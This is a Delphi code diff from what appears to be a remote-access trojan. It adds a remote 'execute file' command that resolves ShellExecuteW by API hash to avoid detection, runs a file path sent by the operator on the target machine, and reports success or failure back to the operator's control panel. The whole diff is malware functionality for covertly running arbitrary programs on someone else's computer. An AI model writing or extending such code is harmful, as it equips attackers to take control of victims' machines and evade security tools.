@@ -163,8 +163,14 @@ begin
 end;
 
 procedure pExecuteFile(pConn:PConnRec; mBuff:PWideChar);
+var
+  xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
 begin
-  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
+  xShellExecuteW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hShell32, $1FA8A1D9, 13);
+  if xShellExecuteW(0, nil, mBuff, nil, nil, SW_SHOW) > 32 then
+    pConn.xSendBuffer(pConn, CMD_FILE_EXECUTE_OK, nil, 1, False)
+  else
+    pConn.xSendBuffer(pConn, CMD_FILE_EXECUTE_FAIL, nil, 1, False);
 end;
 
 procedure pDeleteFile(pConn:PConnRec; mBuff:PWideChar);
@@ -299,6 +305,14 @@ begin
     CMD_FILE_DELETE_FAIL:
       begin
         SendListDirectories(edtPath.Text);
+      end;
+    CMD_FILE_EXECUTE_OK:
+      begin
+        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'File executed!';
+      end;
+    CMD_FILE_EXECUTE_FAIL:
+      begin
+        TForm3(mClientThread.frmControl).StatusBar1.SimpleText := 'Cant execute file!';
       end;
   end;
 end;
